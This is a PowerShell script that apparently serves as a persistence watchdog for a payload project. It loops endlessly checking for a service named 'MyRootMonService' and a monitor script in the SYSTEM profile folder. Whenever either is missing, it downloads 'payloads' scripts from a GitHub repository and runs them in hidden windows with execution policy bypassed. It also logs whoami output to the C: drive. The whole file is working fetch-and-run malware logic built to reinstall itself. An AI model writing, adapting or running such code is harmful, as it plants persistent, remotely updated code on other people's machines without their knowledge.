param(
    [string]$rootPath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
$serviceName = "MyRootMonService"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"

$initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"

$rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$rootMonScript = "$rootMonScript\root_mon.ps1" 

if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

function Get-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Get-ServiceName{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

$doesExist = $true
while($true){
    $r = Get-ServiceReg -path $regPath
    $n = Get-ServiceName -name $serviceName

    if(-not(Test-Path -Path $rootMonScript -PathType Leaf)){
        if(-not($doesExist)){
            $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootMonScript = "$rootMonScript\root_mon.ps1"
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript
    }
    
    elseif($r -or $n){
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript
    }
    $doesExist = $false
}